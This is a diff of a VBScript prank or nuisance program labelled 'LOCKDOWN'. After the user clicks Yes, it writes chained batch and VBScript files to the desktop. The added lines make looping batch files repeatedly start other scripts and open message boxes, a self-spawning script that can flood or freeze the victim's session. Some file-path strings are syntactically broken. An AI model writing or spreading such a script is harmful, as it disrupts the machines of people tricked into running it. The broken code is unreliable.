@@ -13,7 +13,7 @@ If intMessage = vbYes Then
 	vbYesNo + vbQuestion, "LOCKDOWN")
 
 if intMessage = vbYes Then
-		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\teste2.bat", True)
+		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test2.bat", True)
 
 	MyFile.WriteLine("@echo off")
 	MyFile.WriteLine("@echo .")
@@ -23,11 +23,15 @@ if intMessage = vbYes Then
 	MyFile.WriteLine("@echo    ***                                         ***")
 	MyFile.WriteLine("@echo    ***********************************************")
 	MyFile.WriteLine("@echo .")
-
 	MyFile.WriteLine("timeout /t 10 /nobreak")
-	MyFile.WriteLine("start teste3.bat")
+	MyFile.WriteLine("start test5.bat")
+
+	Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test5.bat", True)
+	
+	MyFile.WriteLine("start test3.bat")
 	MyFile.WriteLine("color 0a")
 	MyFile.WriteLine(":top")
+	MyFile.WriteLine("start test4.vbs")
 	MyFile.WriteLine("@echo ________________$$$$")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
@@ -54,8 +58,12 @@ if intMessage = vbYes Then
 	Wscript.Sleep 1000
 	Set WshShell = CreateObject("WScript.Shell")
 	Set WshShellExec = WshShell.Exec(Command)
+	
+	Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test4.vbs", True)
 
-		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\teste3.bat", True)
+	MyFile.WriteLine("intMessage = MsgBox(""LOCKDOWN"", vbOkOnly + vbExclamation, ""Delta1"")")
+
+		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test3.bat", True)
 	MyFile.WriteLine("@echo off")
 	MyFile.WriteLine("color 3")
 	MyFile.WriteLine(":loop")
